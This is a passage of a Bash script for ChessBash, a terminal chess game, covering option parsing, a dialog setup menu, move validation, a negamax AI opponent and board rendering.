	echo -e "    -A \e[2mNUMBER\e[0m  Color code of first player (Default: \e[2m$colorPlayerA\e[0m)"
	echo -e "    -B \e[2mNUMBER\e[0m  Color code of second player (Default: \e[2m$colorPlayerB\e[0m)"
	echo "    -n         Use normal (instead of color filled) figures"
	echo "    -m         Disable color marking of possible moves"
	echo
	echo -e "\e[2m(Default values/options should suit most systems - only if you encounter a"
	echo -e "problem you should have a further investigation of these script parameters."
	echo -e "Or just switch to a real chess game with great graphics and ai! ;)\e[0m"
	echo
}
# Parse command line arguments
while getopts ":a:A:b:B:c:P:s:t:w:dghilmMnpvVz" options; do
	case $options in
	a )	if [[ -z "$OPTARG" ]] ;then
		echo "No valid name for first player specified!" >&2
		exit 1
# IPv4 && IPv6 validation, source: http://stackoverflow.com/a/9221063
		elif validIP "$OPTARG" ; then
		remote=-1
		remoteip="$OPTARG"
	else
		namePlayerA="$OPTARG"
	fi ;;
	A )	if ! getColor "$OPTARG" ; then
		colorPlayerA=$?
	else
		echo "'$OPTARG' is not a valid color!" >&2
		exit 1
	fi ;;
	b )	if [[ -z "$OPTARG" ]] ;then
		echo "No valid name for second player specified!" >&2
		exit 1
	elif [[ "${OPTARG,,}" == "$remotekeyword" ]] ; then
		remote=1
	else
		namePlayerB="$OPTARG"
	fi ;;
	B )	if ! getColor "$OPTARG" ; then
		colorPlayerB=$?
	else
		echo "'$OPTARG' is not a valid color!" >&2
	exit 1
	fi ;;
	s )	if validNumber "$OPTARG" ; then
		strength=$OPTARG
	else
		echo "'$OPTARG' is not a valid strength!" >&2
	exit 1
	fi ;;
	P )	if validPort "$OPTARG" ; then
		port=$OPTARG
	else
		echo "'$OPTARG' is not a valid gaming port!" >&2
		exit 1
	fi ;;
	w )	if validNumber "$OPTARG" ; then
		sleep=$OPTARG
	else
		echo "'$OPTARG' is not a valid waiting time!" >&2
	exit 1
	fi ;;
	c )	if [[ -z "$OPTARG" ]] ; then
		echo "No valid path for cache file!" >&2
		exit 1
	else
		cache="$OPTARG"
	fi ;;
	t )	if validNumber "$OPTARG" ; then
		computer=$OPTARG
	else
		echo "'$OPTARG' is not a valid number for steps!" >&2
		exit 1
	fi ;;
	d )	color=false ;;
	g )	guiconfig=true ;;
	l )	unicodelabels=false ;;
	n )	colorFill=false ;;
	m )	colorHelper=false ;;
	M )	mouse=false ;;
	p )	ascii=true
		unicodelabels=false ;;
	i )	warnings=true ;;
	v )	version ;;
	V )	cursor=false ;;
	z )	require gzip
		require zcat
		cachecompress=true ;;
	h )	help
		exit 0 ;;
	\?)
		echo "Invalid option: -$OPTARG" >&2 ;;
	esac
done
# get terminal dimension
echo -en '\e[18t'
if read -d "t" -s -t 1 tmp ; then
	termDim=(${tmp//;/ })
	termHeight=${termDim[1]}
	termWidth=${termDim[2]}
else
	termHeight=24
	termWidth=80
fi
# gui config
if $guiconfig ; then
# find a dialog system
if type gdialog >/dev/null 2>&1 ; then
	dlgtool="gdialog"
	dlgh=0
	dlgw=100
elif type dialog >/dev/null 2>&1 ; then
	dlgtool="dialog"
	dlgh=0
	dlgw=0
elif type whiptail >/dev/null 2>&1 ; then
	dlgtool="whiptail"
	dlgh=0
	dlgw=$(( termWidth-10 ))
else
	dlgtool=""
	error "The graphical configuration requires gdialog/zenity, dialog or at least whiptail - but none of them was found on your system. You have to use the arguments to configure the game unless you install one of the required tools..."
fi
# Output the type of the first player in a readable string
	function typeOfPlayerA() {
	if [[ "$remote" -eq "-1" ]] ; then
		echo "Connect to $remoteip (Port $port)"
		return 2
	elif isAI $A ; then
		echo "Artificial Intelligence (with strength $strength)"
		return 1
	else
		echo "Human named $namePlayerA"
		return 0
	fi
}
# Output the type of the second player in a readable string
	function typeOfPlayerB() {
	if [[ "$remote" -eq "1" ]] ; then
		echo "Host server at port $port"
		return 2
	elif isAI $B ; then
		echo "Artificial Intelligence (with strength $strength)"
		return 1
	else
		echo "Human named $namePlayerB"
		return 0
	fi
}
# Execute a dialog
# Params: Dialog params (variable length)
# Prints: Dialog output seperated by new lines
# Returns the dialog program return or 255 if no dialog tool available
	function dlg() {
	if [[ -n "$dlgtool" ]] ; then
		$dlgtool --backtitle "ChessBash" "$@" 3>&1 1>&2 2>&3 | sed -e "s/|/\n/g" | sort -u
		return ${PIPESTATUS[0]}
	else
		return 255
	fi
}
# Print a message box with a warning/error message
# Params:
#	$1	Message
	function dlgerror() {
#TODO: normal error
	dlg --msgbox "$1" $dlgh $dlgw
}
# Start the dialog configuration
# Neither params nor return, this is just a function for hiding local variables!
	function dlgconfig() {
	local option_mainmenu_playerA="First Player"
	local option_mainmenu_playerB="Second Player"
	local option_mainmenu_settings="Game settings"
	local dlg_on="ON"
	local dlg_off="OFF"
	declare -a option_player=( "Human" "Computer" "Network" )
	declare -a option_settings=( "Color support" "Unicode support" "Verbose Messages" "Mouse support" "AI Cache" )
	local dlg_main
	while dlg_main=$(dlg --ok-button "Edit" --cancel-button "Start Game" --menu "New Game" $dlgh $dlgw 0 "$option_mainmenu_playerA" "$(typeOfPlayerA || true)" "$option_mainmenu_playerB" "$(typeOfPlayerB || true )" "$option_mainmenu_settings" "Color, Unicode, Mouse & AI Cache") ; do
		case "$dlg_main" in
# Player A settings
	"$option_mainmenu_playerA" )
		typeOfPlayerA > /dev/null
		local type=$?
		local dlg_player
		dlg_player=$(dlg --nocancel --default-item "${option_player[$type]}" --menu "$option_mainmenu_playerA" $dlgh $dlgw 0 "${option_player[0]}" "$( isAI $A && echo "$option_mainmenu_playerA" || echo "$namePlayerA" )" "${option_player[1]}" "with AI (of strength $strength)" "${option_player[2]}" "Connect to Server $remoteip" )
		case "$dlg_player" in
# Human --> get Name
	*"${option_player[0]}"* )
		[[ "$remote" -eq "-1" ]] && remote=0
		local dlg_namePlayer
		dlg_namePlayer=$(dlg --inputbox "Name of $option_mainmenu_playerA" $dlgh $dlgw "$( isAI $A && echo "$option_mainmenu_playerA" || echo "$namePlayerA" )") && namePlayerA="$dlg_namePlayer"
		;;
# Computer --> get Strength
	*"${option_player[1]}"* )
	[[ "$remote" -eq "-1" ]] && remote=0
		namePlayerA=$aikeyword
		local dlg_strength
	if dlg_strength=$(dlg --inputbox "Strength of Computer" $dlgh $dlgw  "$strength") ; then
	if validNumber "$dlg_strength" ; then
		strength=$dlg_strength
	else
		dlgerror "Your input '$dlg_strength' is not a valid number!"
	fi
	fi ;;
# Network --> get Server and Port
	*"${option_player[2]}"* )
		local dlg_remoteip
	if dlg_remoteip=$(dlg --inputbox "IP(v4 or v6) address of Server" $dlgh $dlgw "$remoteip") ; then
	if validIP "$dlg_remoteip" ; then
		remote=-1
		remoteip="$dlg_remoteip"
		local dlg_networkport
	if dlg_networkport=$(dlg --inputbox "Server Port (non privileged)" $dlgh $dlgw "$port") ; then
	if validPort "$dlg_networkport" ; then
		port=$dlg_networkport
	else
			dlgerror "Your input '$dlg_remoteip' is not a valid Port!"
	fi
	fi
	else
		dlgerror "Your input '$dlg_remoteip' is no valid IP address!"
	continue
	fi
	fi
		;;
esac
# Player color
if $color ; then
	local colorlist=""
	local c
for (( c=1; c<7; c++ )) ; do
	colorlist+=" ${colors[$c]^} figures"
done
	local dlg_player_color
if dlg_player_color=$(dlg --nocancel --default-item "${colors[$colorPlayerA]^}" --menu "Color of $option_mainmenu_playerA" $dlgh $dlgw 0 "$colorlist") ; then
	getColor "$dlg_player_color" || colorPlayerA=$?
fi
fi ;;
# Player B settings
"$option_mainmenu_playerB" )
	typeOfPlayerB > /dev/null
	local type=$?
	local dlg_player
	dlg_player=$(dlg --nocancel --default-item "${option_player[$type]}" --menu "$option_mainmenu_playerB" $dlgh $dlgw 0 "${option_player[0]}" "$( isAI $B && echo "$option_mainmenu_playerB" || echo "$namePlayerB" )" "${option_player[1]}" "with AI (of strength $strength)" "${option_player[2]}" "Wait for connections on port $port" )
case "$dlg_player" in
# Human --> get Name
	*"${option_player[0]}"* )
		[[ "$remote" -eq "1" ]] && remote=0
		local dlg_namePlayer
		dlg_namePlayer=$(dlg --inputbox "Name of $option_mainmenu_playerB" $dlgh $dlgw "$( isAI $B && echo "$option_mainmenu_playerB" || echo "$namePlayerB" )") && namePlayerA="$dlg_namePlayer"
 ;;
# Computer --> get Strength
	*"${option_player[1]}"* )
		[[ "$remote" -eq "1" ]] && remote=0
		namePlayerB=$aikeyword
		local dlg_strength
	if dlg_strength=$(dlg --inputbox "Strength of Computer" $dlgh $dlgw  "$strength") ; then
	if validNumber "$dlg_strength" ; then
		strength=$dlg_strength
	else
		dlgerror "Your input '$dlg_strength' is not a valid number!"
	fi
	fi ;;
# Network --> get Server and Port
	*"${option_player[2]}"* )
		remote=1
		local dlg_networkport
	if dlg_networkport=$(dlg --inputbox "Server Port (non privileged)" $dlgh $dlgw "$port") ; then
	 if validPort "$dlg_networkport" ; then
		port=$dlg_networkport
	else
		dlgerror "Your input '$dlg_remoteip' is not a valid Port!"
	fi
	fi ;;
esac
# Player color
if $color ; then
	local colorlist=""
	local c
for (( c=1; c<7; c++ )) ; do
	colorlist+=" ${colors[$c]^} figures"
done
	local dlg_player_color
	if dlg_player_color=$(dlg --nocancel --default-item "${colors[$colorPlayerB]^}" --menu "Color of $option_mainmenu_playerB" $dlgh $dlgw 0 "$colorlist") ; then
		getColor "$dlg_player_color" || colorPlayerB=$?
fi
fi ;;
# Game settings
	"$option_mainmenu_settings" )
	if dlg_settings=$(dlg --separate-output --checklist "$option_mainmenu_settings" $dlgh $dlgw $dlgw "${option_settings[0]}" "with movements and figures" $($color && echo $dlg_on || echo $dlg_off) "${option_settings[1]}" "optional including board labels" $($ascii && echo $dlg_off || echo $dlg_on) "${option_settings[2]}" "be chatty" $($warnings && echo $dlg_on || echo $dlg_off) "${option_settings[3]}" "be clicky" $($mouse && echo $dlg_on || echo $dlg_off) "${option_settings[4]}" "in a regluar file" $([[ -n "$cache" ]] && echo $dlg_on || echo $dlg_off) ) ; then
# Color support
	if [[ "$dlg_settings" == *"${option_settings[0]}"* ]] ; then
		color=true
		dlg --yesno "Enable movement helper (colorize possible move)?" $dlgh $dlgw && colorHelper=true || colorHelper=false
		dlg --yesno "Use filled (instead of outlined) figures for both player?" $dlgh $dlgw && colorFill=true || colorFill=false
	else
		color=false
		colorFill=false
		colorHelper=false
	fi
# Unicode support
	if [[ "$dlg_settings" == *"${option_settings[1]}"* ]] ; then
		ascii=false
		( dlg --yesno "Use Unicode for board labels?" $dlgh $dlgw ) && unicodelabels=true || unicodelabels=false
	else
		ascii=true
		unicodelabels=false
	fi
# Verbose messages
[[ "$dlg_settings" == *"${option_settings[2]}"* ]] && warnings=true || warnings=false
# Mouse support
[[ "$dlg_settings" == *"${option_settings[3]}"* ]] && mouse=true || mouse=false
# AI Cache
local dlg_cache
	if [[ "$dlg_settings" == *"${option_settings[4]}"* ]] && dlg_cache=$(dlg --inputbox "Cache file:" $dlgh $dlgw "$([[ -z "$cache" ]] && echo "$(pwd)/chessbash.cache" || echo "$cache")") && [[ -n "$dlg_cache" ]] ; then
		cache="$dlg_cache"
		type gzip >/dev/null 2>&1 && type zcat >/dev/null 2>&1 && dlg --yesno "Use GZip compression for Cache?" $dlgh $dlgw && cachecompress=true || cachecompress=false
	else
		cache=""
	fi
# Waiting time (ask always)
local dlg_sleep
	if dlg_sleep=$(dlg --inputbox "How long should every message be displayed (in seconds)?" $dlgh $dlgw "$sleep") ; then
	if validNumber "$dlg_sleep" ; then
		sleep=$dlg_sleep
	else
		dlgerror "Your input '$dlg_sleep' is not a valid number!"
	fi
	fi
	fi ;;
# Other --> exit (gdialog)
	* )
	break ;;
	esac
	done
	}
# start config dialog
	dlgconfig
fi
# Save screen
if $cursor ; then
	echo -e "\e7\e[s\e[?47h\e[?25l\e[2J\e[H"
fi
# lookup tables
declare -A cacheLookup
declare -A cacheFlag
declare -A cacheDepth
# associative arrays are faster than numeric ones and way more readable
declare -A redraw
if $cursor ; then
for (( y=0; y<10; y++ )) ; do
	for (( x=-2; x<8; x++ )) ; do
		redraw[$y,$x]=""
	done
done
fi
declare -A field
# initialize setting - first row
declare -a initline=( 4  2  3  6  5  3  2  4 )
for (( x=0; x<8; x++ )) ; do
	field[0,$x]=${initline[$x]}
	field[7,$x]=$(( (-1) * ${initline[$x]} ))
done
# set pawns
for (( x=0; x<8; x++ )) ; do
	field[1,$x]=1
	field[6,$x]=-1
done
# set empty fields
for (( y=2; y<6; y++ )) ; do
	for (( x=0; x<8; x++ )) ; do
		field[$y,$x]=0
	done
done
# readable figure names
declare -a figNames=( "(empty)" "pawn" "knight" "bishop" "rook" "queen" "king" )
# ascii figure names (for ascii output)
declare -a asciiNames=( "k" "q" "r" "b" "n" "p" " " "P" "N" "B" "R" "Q" "K" )
# figure weight (for heuristic)
declare -a figValues=( 0 1 5 5 6 17 42 )
# Warning message on invalid moves (Helper)
# Params:
#	$1	message
# (no return value)
function warn() {
	message="\e[41m\e[1m$1\e[0m\n"
	draw
}
# Readable coordinates
# Params:
#	$1	row position
#	$2	column position
# Writes coordinates to stdout
function coord() {
	echo -en "\x$((48-$1))$(($2+1))"
}
# Get name of player
# Params:
#	$1	player
# Writes name to stdout
function namePlayer() {
if (( $1 < 0 )) ; then
	if $color ; then
		echo -en "\e[3${colorPlayerA}m"
	fi
	if isAI "$1" ; then
		echo -n "$aiPlayerA"
	else
		echo -n "$namePlayerA"
	fi
else
	if $color ; then
		echo -en "\e[3${colorPlayerB}m"
	fi
	if isAI "$1" ; then
		echo -n "$aiPlayerB"
	else
		echo -n "$namePlayerB"
	fi
fi
if $color ; then
	echo -en "\e[0m"
fi
}
# Get name of figure
# Params:
#	$1	figure
# Writes name to stdout
function nameFigure() {
	if (( $1 < 0 )) ; then
		echo -n "${figNames[$1*(-1)]}"
	else
		echo -n "${figNames[$1]}"
	fi
}
# Check win/loose position
# (player has king?)
# Params:
#	$1	player
# Return status code 1 if no king
function hasKing() {
local player=$1;
local x
local y
for (( y=0;y<8;y++ )) ; do
	for (( x=0;x<8;x++ )) ; do
		if (( ${field[$y,$x]} * player == 6 )) ; then
		return 0
		fi
	done
done
return 1
}
# Check validity of a concrete single movement
# Params:
#	$1	origin Y position
#	$2	origin X position
#	$3	target Y position
#	$4	target X position
#	$5	current player
# Returns status code 0 if move is valid
function canMove() {
	local fromY=$1
	local fromX=$2
	local toY=$3
	local toX=$4
	local player=$5
	local i
	if (( fromY < 0 || fromY >= 8 || fromX < 0 || fromX >= 8 || toY < 0 || toY >= 8 || toX < 0 || toX >= 8 || ( fromY == toY && fromX == toX ) )) ; then
		return 1
	fi
	local from=${field[$fromY,$fromX]}
	local to=${field[$toY,$toX]}
	local fig=$(( from * player ))
	if (( from == 0 || from * player < 0 || to * player > 0 || player * player != 1 )) ; then
		return 1
# pawn
elif (( fig == 1 )) ; then
	if (( fromX == toX && to == 0 && ( toY - fromY == player || ( toY - fromY == 2 * player && ${field["$((player + fromY)),$fromX"]} == 0 && fromY == ( player > 0 ? 1 : 6 ) ) ) )) ; then
		return 0
		else
		return $(( ! ( (fromX - toX) * (fromX - toX) == 1 && toY - fromY == player && to * player < 0 ) ))
	fi
# queen, rock and bishop
elif (( fig == 5 || fig == 4  || fig == 3 )) ; then
# rock - and queen
	if (( fig != 3 )) ; then
	if (( fromX == toX )) ; then
		for (( i = ( fromY < toY ? fromY : toY ) + 1 ; i < ( fromY > toY ? fromY : toY ) ; i++ )) ; do
		if (( ${field[$i,$fromX]} != 0 )) ; then
			return 1
			fi
			done
			return 0
elif (( fromY == toY )) ; then
	for (( i = ( fromX < toX ? fromX : toX ) + 1 ; i < ( fromX > toX ? fromX : toX ) ; i++ )) ; do
	if (( ${field[$fromY,$i]} != 0 )) ; then
			return 1
			fi
			done
			return 0
		fi
	fi
# bishop - and queen
if (( fig != 4 )) ; then
	if (( ( fromY - toY ) * ( fromY - toY ) != ( fromX - toX ) * ( fromX - toX ) )) ; then
	return 1
	fi
	for (( i = 1 ; i < ( $fromY > toY ? fromY - toY : toY - fromY) ; i++ )) ; do
	if (( ${field[$((fromY + i * (toY - fromY > 0 ? 1 : -1 ) )),$(( fromX + i * (toX - fromX > 0 ? 1 : -1 ) ))]} != 0 )) ; then
		return 1
		fi
		done
		return 0
fi
# nothing found? wrong move.
	return 1
# knight
elif (( fig == 2 )) ; then
	return $(( ! ( ( ( fromY - toY == 2 || fromY - toY == -2) && ( fromX - toX == 1 || fromX - toX == -1 ) ) || ( ( fromY - toY == 1 || fromY - toY == -1) && ( fromX - toX == 2 || fromX - toX == -2 ) ) ) ))
# king
elif (( fig == 6 )) ; then
	return $(( !( ( ( fromX - toX ) * ( fromX - toX ) ) <= 1 &&  ( ( fromY - toY ) * ( fromY - toY ) ) <= 1 ) ))
# invalid figure
else
	error "Invalid figure '$from'!"
	exit 1
fi
}
# minimax (game theory) algorithm for evaluate possible movements
# (the heart of your computer enemy)
# currently based on negamax with alpha/beta pruning and transposition tables liked described in
# http://en.wikipedia.org/wiki/Negamax#NegaMax_with_Alpha_Beta_Pruning_and_Transposition_Tables
# Params:
#	$1	current search depth
#	$2	alpha (for pruning)
#	$3	beta (for pruning)
#	$4	current moving player
#	$5	preserves the best move (for ai) if true
# Returns best value as status code
function negamax() {
local depth=$1
local a=$2
local b=$3
local player=$4
local save=$5
# transposition table
local aSave=$a
local hash
hash="$player ${field[@]}"
if ! $save && test "${cacheLookup[$hash]+set}" && (( ${cacheDepth[$hash]} >= depth )) ; then
	local value=${cacheLookup[$hash]}
	local flag=${cacheFlag[$hash]}
	if (( flag == 0 )) ; then
		return $value
	elif (( flag == 1 && value > a )) ; then
		a=$value
	elif (( flag == -1 && value < b )) ; then
		b=$value
	fi
	if (( a >= b )) ; then
		return $value
	fi
fi
# lost own king?
if ! hasKing "$player" ; then
	cacheLookup[$hash]=$(( strength - depth + 1 ))
	cacheDepth[$hash]=$depth
	cacheFlag[$hash]=0
	return $(( strength - depth + 1 ))
# use heuristics in depth
elif (( depth <= 0 )) ; then
	local values=0
	for (( y=0; y<8; y++ )) ; do
		for (( x=0; x<8; x++ )) ; do
			local fig=${field[$y,$x]}
			if (( ${field[$y,$x]} != 0 )) ; then
				local figPlayer=$(( fig < 0 ? -1 : 1 ))
# a more simple heuristic would be values=$(( $values + $fig ))
	(( values += ${figValues[$fig * $figPlayer]} * figPlayer ))
# pawns near to end are better
if (( fig == 1 )) ; then
	if (( figPlayer > 0 )) ; then
	(( values += ( y - 1 ) / 2 ))
else
	(( values -= ( 6 + y ) / 2 ))
fi
fi
fi
done
done
	values=$(( 127 + ( player * values ) ))
# ensure valid bash return range
if (( values > 253 - strength )) ; then
	values=$(( 253 - strength ))
elif (( values < 2 + strength )) ; then
	values=$(( 2 + strength ))
fi
	cacheLookup[$hash]=$values
	cacheDepth[$hash]=0
	cacheFlag[$hash]=0
	return $values
# calculate best move
else
	local bestVal=0
	local fromY
	local fromX
	local toY
	local toX
	local i
	local j
	for (( fromY=0; fromY<8; fromY++ )) ; do
		for (( fromX=0; fromX<8; fromX++ )) ; do
		local fig=$(( ${field[$fromY,$fromX]} * ( player ) ))
# precalc possible fields (faster then checking every 8*8 again)
	local targetY=()
	local targetX=()
	local t=0
# empty or enemy
if (( fig <= 0 )) ; then
	continue
# pawn
elif (( fig == 1 )) ; then
	targetY[$t]=$(( player + fromY ))
	targetX[$t]=$(( fromX ))
	(( t += 1 ))
	targetY[$t]=$(( 2 * player + fromY ))
	targetX[$t]=$(( fromX ))
	(( t += 1 ))
	targetY[$t]=$(( player + fromY ))
	targetX[$t]=$(( fromX + 1 ))
	(( t += 1 ))
	targetY[$t]=$(( player + fromY ))
	targetX[$t]=$(( fromX - 1 ))
	(( t += 1 ))
# knight
elif (( fig == 2 )) ; then
	for (( i=-1 ; i<=1 ; i=i+2 )) ; do
	for (( j=-1 ; j<=1 ; j=j+2 )) ; do
		targetY[$t]=$(( fromY + 1 * i ))
		targetX[$t]=$(( fromX + 2 * j ))
		(( t + 1 ))
		targetY[$t]=$(( fromY + 2 * i ))
		targetX[$t]=$(( fromX + 1 * j ))
		(( t + 1 ))
done
done
# king
elif (( fig == 6 )) ; then
	for (( i=-1 ; i<=1 ; i++ )) ; do
	for (( j=-1 ; j<=1 ; j++ )) ; do
	targetY[$t]=$(( fromY + i ))
	targetX[$t]=$(( fromX + j ))
	(( t += 1 ))
	done
done
else
# bishop or queen
if (( fig != 4 )) ; then
	for (( i=-8 ; i<=8 ; i++ )) ; do
	if (( i != 0 )) ; then
# can be done nicer but avoiding two loops!
		targetY[$t]=$(( fromY + i ))
		targetX[$t]=$(( fromX + i ))
		(( t += 1 ))
		targetY[$t]=$(( fromY - i ))
		targetX[$t]=$(( fromX - i ))
		(( t += 1 ))
		targetY[$t]=$(( fromY + i ))
		targetX[$t]=$(( fromX - i ))
		(( t += 1 ))
		targetY[$t]=$(( fromY - i ))
		targetX[$t]=$(( fromX + i ))
		(( t += 1 ))
	fi
	done
fi
# rock or queen
if (( fig != 3 )) ; then
	for (( i=-8 ; i<=8 ; i++ )) ; do
	if (( i != 0 )) ; then
		targetY[$t]=$(( fromY + i ))
		targetX[$t]=$(( fromX ))
		(( t += 1 ))
		targetY[$t]=$(( fromY - i ))
		targetX[$t]=$(( fromX ))
		(( t += 1 ))
		targetY[$t]=$(( fromY ))
		targetX[$t]=$(( fromX + i ))
		(( t += 1 ))
		targetY[$t]=$(( fromY ))
		targetX[$t]=$(( fromX - i ))
		(( t += 1 ))
	fi
	done
	fi
fi
# process all available moves
for (( j=0; j < t; j++ )) ; do
	local toY=${targetY[$j]}
	local toX=${targetX[$j]}
# move is valid
if (( toY >= 0 && toY < 8 && toX >= 0 && toX < 8 )) &&  canMove "$fromY" "$fromX" "$toY" "$toX" "$player" ; then
	local oldFrom=${field[$fromY,$fromX]};
	local oldTo=${field[$toY,$toX]};
	field[$fromY,$fromX]=0
	field[$toY,$toX]=$oldFrom
# pawn to queen
if (( oldFrom == player && toY == ( player > 0 ? 7 : 0 ) )) ;then
	field["$toY,$toX"]=$(( 5 * player ))
fi
# recursion
negamax $(( depth - 1 )) $(( 255 - b )) $(( 255 - a )) $(( player * (-1) )) false
local val=$(( 255 - $? ))
field[$fromY,$fromX]=$oldFrom
field[$toY,$toX]=$oldTo
	if (( val > bestVal )) ; then
		bestVal=$val
	if $save ; then
		selectedX=$fromX
		selectedY=$fromY
		selectedNewX=$toX
		selectedNewY=$toY
	fi
	fi
	if (( val > a )) ; then
		a=$val
	fi
	if (( a >= b )) ; then
		break 3
	fi
	fi
		done
	done
done
cacheLookup[$hash]=$bestVal
cacheDepth[$hash]=$depth
	if (( bestVal <= aSave )) ; then
		cacheFlag[$hash]=1
	elif (( bestVal >= b )) ; then
		cacheFlag[$hash]=-1
	else
		cacheFlag[$hash]=0
	fi
	return $bestVal
	fi
}
# Perform a concrete single movement
# Params:
# 	$1	current player
# Globals:
#	$selectedY
#	$selectedX
#	$selectedNewY
#	$selectedNewX
# Return status code 0 if movement was successfully performed
function move() {
local player=$1
if canMove "$selectedY" "$selectedX" "$selectedNewY" "$selectedNewX" "$player" ; then
	local fig=${field[$selectedY,$selectedX]}
	field[$selectedY,$selectedX]=0
	field[$selectedNewY,$selectedNewX]=$fig
# pawn to queen
if (( fig == player && selectedNewY == ( player > 0 ? 7 : 0 ) )) ; then
	field[$selectedNewY,$selectedNewX]=$(( 5 * player ))
fi
return 0
fi
return 1
}
# Unicode helper function (for draw)
# Params:
#	$1	first hex unicode character number
#	$2	second hex unicode character number
#	$3	third hex unicode character number
#	$4	integer offset of third hex
# Outputs escape character
function unicode() {
if ! $ascii ; then
	printf '\\x%s\\x%s\\x%x' "$1" "$2" "$(( 0x$3 + ( $4 ) ))"
fi
}
# Ascii helper function (for draw)
# Params:
#	$1	decimal ascii character number
# Outputs escape character
function ascii() {
	echo -en "\x$1"
}
# Get ascii code number of character
# Params:
#	$1	ascii character
# Outputs decimal ascii character number
function ord() {
	LC_CTYPE=C printf '%d' "'$1"
}
# Audio and visual bell
# No params or return
function bell() {
if (( lastBell != SECONDS )) ; then
	echo -en "\a\e[?5h"
	sleep 0.1
	echo -en "\e[?5l"
	lastBell=$SECONDS
fi
}
# Draw one field (of the gameboard)
# Params:
#	$1	y coordinate
#	$2	x coordinate
#	$3	true if cursor should be moved to position
# Outputs formated field content
function drawField(){
	local y=$1
	local x=$2
	echo -en "\e[0m"
# move coursor to absolute position
if $3 ; then
	local yScr=$(( y + originY ))
	local xScr=$(( x * 2 + originX ))
	if $ascii && (( x >= 0 )) ; then
		local xScr=$(( x * 3 + originX ))
	fi
	echo -en "\e[${yScr};${xScr}H"
fi
# draw vertical labels
if (( x==labelX && y >= 0 && y < 8)) ; then
	if $hoverInit && (( hoverY == y )) ; then
	if $color ; then
		echo -en "\e[3${colorHover}m"
	else
		echo -en "\e[4m"
	fi
	elif (( selectedY == y )) ; then
	if ! $color ; then
		echo -en "\e[2m"
	elif (( ${field[$selectedY,$selectedX]} < 0 )) ; then
		echo -en "\e[3${colorPlayerA}m"
	else
		echo -en "\e[3${colorPlayerB}m"
	fi
fi
# line number (alpha numeric)
if $unicodelabels ; then
	echo -en "$(unicode e2 92 bd -$y) "
else
	echo -en " \x$((48 - $y))"
fi
# clear format
# draw horizontal labels
elif (( x>=0 && y==labelY )) ; then
	if $hoverInit && (( hoverX == x )) ; then
	if $color ; then
		echo -en "\e[3${colorHover}m"
	else
		echo -en "\e[4m"
	fi
	elif (( selectedX == x )) ; then
	if ! $color ; then
		echo -en "\e[2m"
	elif (( ${field[$selectedY,$selectedX]} < 0 )) ; then
		echo -en "\e[3${colorPlayerA}m"
	else
		echo -en "\e[3${colorPlayerB}m"
	fi
	else
		echo -en "\e[0m"
	fi
	if $unicodelabels ; then
		echo -en "$(unicode e2 9e 80 $x )\e[0m "
	else
	if $ascii ; then
		echo -n " "
	fi
		echo -en "\x$((31 + $x))\e[0m "
	fi
# draw field
elif (( y >=0 && y < 8 && x >= 0 && x < 8 )) ; then
	local f=${field["$y,$x"]}
	local black=false
if (( ( x + y ) % 2 == 0 )) ; then
	local black=true
fi
# black/white fields
if $black ; then
if $color ; then
	echo -en "\e[47;107m"
else
	echo -en "\e[7m"
fi
else
	$color && echo -en "\e[40m"
fi
# background
if $hoverInit && (( hoverX == x && hoverY == y )) ; then
if ! $color ; then
	echo -en "\e[4m"
elif $black ; then
	echo -en "\e[4${colorHover};10${colorHover}m"
else
	echo -en "\e[4${colorHover}m"
fi
elif (( selectedX != -1 && selectedY != -1 )) ; then
	local selectedPlayer=$(( ${field[$selectedY,$selectedX]} > 0 ? 1 : -1 ))
if (( selectedX == x && selectedY == y )) ; then
if ! $color ; then
	echo -en "\e[2m"
elif $black ; then
	echo -en "\e[47m"
else
	echo -en "\e[40;100m"
fi
elif $color && $colorHelper && canMove "$selectedY" "$selectedX" "$y" "$x" "$selectedPlayer" ; then
if $black ; then
if (( selectedPlayer < 0 )) ; then
	echo -en "\e[4${colorPlayerA};10${colorPlayerA}m"
else
	echo -en "\e[4${colorPlayerB};10${colorPlayerB}m"
fi
else
if (( selectedPlayer < 0 )) ; then
	echo -en "\e[4${colorPlayerA}m"
else
	echo -en "\e[4${colorPlayerB}m"
fi
fi
fi
fi
# empty field?
if ! $ascii && (( f == 0 )) ; then
	echo -en "  "
else
# figure colors
if $color ; then
if (( selectedX == x && selectedY == y )) ; then
if (( f < 0 )) ; then
	echo -en "\e[3${colorPlayerA}m"
else
	echo -en "\e[3${colorPlayerB}m"
fi
else
if (( f < 0 )) ; then
	echo -en "\e[3${colorPlayerA};9${colorPlayerA}m"
else
	echo -en "\e[3${colorPlayerB};9${colorPlayerB}m"
fi
fi
fi
# unicode figures
if $ascii ; then
	echo -en " \e[1m${asciiNames[ $f + 6 ]} "
elif (( f > 0 )) ; then
if $color && $colorFill ; then
	echo -en "$( unicode e2 99 a0 -$f ) "
else
	echo -en "$( unicode e2 99 9a -$f ) "
fi
else
	echo -en "$( unicode e2 99 a0 $f ) "
fi
fi
# three empty chars
elif $ascii && (( x >= 0 )) ; then
	echo -n "   "
# otherwise: two empty chars (on unicode boards)
else
	echo -n "  "
fi
# clear format
	echo -en "\e[0m\e[8m"
}
# Draw the battlefield
# (no params / return value)
function draw() {
local ty
local tx
$useStty && stty -echo
$cursor || echo -e "\e[2J"
echo -e "\e[H\e[?25l\e[0m\n\e[K$title\e[0m\n\e[K"
for (( ty=0; ty<10; ty++ )) ; do
	for (( tx=-2; tx<8; tx++ )) ; do
	if $cursor ; then
		local t
		t="$(drawField "$ty" "$tx" true)"
		if [[ "${redraw[$ty,$tx]}" != "$t" ]]; then
			echo -n "$t"
			redraw[$ty,$tx]="$t"
			log="[$ty,$tx]"
		fi
	else
		drawField "$ty" "$tx" false
	fi
done
$cursor || echo ""
done
$useStty && stty echo
# clear format
echo -en "\e[0m\e[$(( originY + 10 ));0H\e[2K\n\e[2K$message\e[8m"
}
# Read the next move coordinates
# from keyboard (direct access or cursor keypad)
# or use mouse input (if available)
# Returns 0 on success and 1 on abort
function inputCoord(){
	inputY=-1
	inputX=-1
	local ret=0
	local t
	local tx
	local ty
	local oldHoverX=$hoverX
	local oldHoverY=$hoverY
	IFS=''
	$useStty && stty echo
if $mouse ; then
	echo -en "\e[?9h"
fi
while (( inputY < 0 || inputY >= 8 || inputX < 0  || inputX >= 8 )) ; do
read -sN1 a
	case "$a" in
	$'\e' )
	if read -t0.1 -sN2 b ; then
	case "$b" in
		'[A' | 'OA' )
		hoverInit=true
	if (( --hoverY < 0 )) ; then
		hoverY=0
		bell
	fi ;;
	'[B' | 'OB' )
		hoverInit=true
	if (( ++hoverY > 7 )) ; then
		hoverY=7
		bell
	fi ;;
	'[C' | 'OC' )
		hoverInit=true
